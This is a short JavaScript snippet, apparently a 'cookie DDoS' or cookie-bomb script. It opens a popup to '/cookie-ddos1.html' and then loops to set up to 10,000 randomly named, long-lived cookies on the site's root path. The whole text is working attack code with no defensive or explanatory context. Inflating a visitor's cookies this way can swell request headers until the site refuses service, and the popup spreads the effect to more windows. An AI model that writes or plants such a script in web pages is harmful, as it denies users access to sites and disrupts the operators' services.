window.open("/cookie-ddos1.html")


// set a maximum number of cookies to generate
const maxCookies = 10000;

// initialize a counter variable
let i = 0;

// loop through and create cookies with unique names
while (true) {
  // create a unique name for the cookie using a random number
  const cookieName = `myCookie_${Math.random().toString(36).substr(2, 9)}`;

  // set the cookie value
  const cookieValue = 'some value';

  // set the cookie with a unique name and value
  document.cookie = `${cookieName}=${cookieValue}; expires=Thu, 01 Jan 2099 00:00:00 UTC; path=/`;

  // increment the counter variable
  i++;

  // exit the loop if the maximum number of cookies has been reached
  if (i >= maxCookies) {
    break;
  }
}
